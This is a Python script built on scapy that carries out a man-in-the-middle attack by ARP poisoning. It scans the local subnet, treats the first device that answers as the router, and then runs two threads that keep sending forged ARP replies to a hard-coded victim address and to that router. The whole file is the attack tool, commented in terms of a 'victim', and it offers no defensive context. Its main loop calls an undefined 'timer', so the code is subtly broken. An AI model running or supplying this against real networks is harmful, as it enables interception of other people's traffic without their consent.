from scapy.all import ARP, send, Ether, srp, conf
import socket
import threading
import time

def arp_poison(target_ip, target_mac, spoof_ip):
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    while True:
        send(packet, verbose=0)
        time.sleep(2)  # Repeat to keep ARP table poisoned

def get_local_ip_and_subnet():
    hostname = socket.gethostname()
    local_ip = socket.gethostbyname(hostname)
    return local_ip

def get_ip_and_mac():
    local_ip = get_local_ip_and_subnet()
    subnet = '.'.join(local_ip.split('.')[:-1]) + '.1/24'

    arp_request = ARP(pdst=subnet)
    ether = Ether(dst='ff:ff:ff:ff:ff:ff')
    packet = ether / arp_request

    result = srp(packet, timeout=3, verbose=False)[0]

    for sent, received in result:
        if received.psrc != local_ip:  # Skip responses from the local machine
            return received.psrc, received.hwsrc
    
    print("Failed, not connected")
    return None, None

# Settings for ARP poisoning
victim_ip = "192.168.1.100"  # IP address of the victim
victim_mac = "00:0c:29:68:22:51"  # MAC address of the victim (make sure to set this correctly)
router_ip, router_mac = get_ip_and_mac()

try:
    print("Starting ARP poisoning...")
    # Start poisoning threads
    threading.Thread(target=arp_poison, args=(victim_ip, victim_mac, router_ip)).start()
    threading.Thread(target=arp_poison, args=(router_ip, router_mac, victim_ip)).start()
    while True:
        timer.sleep(10)
except KeyboardInterrupt:
    print("stopped")

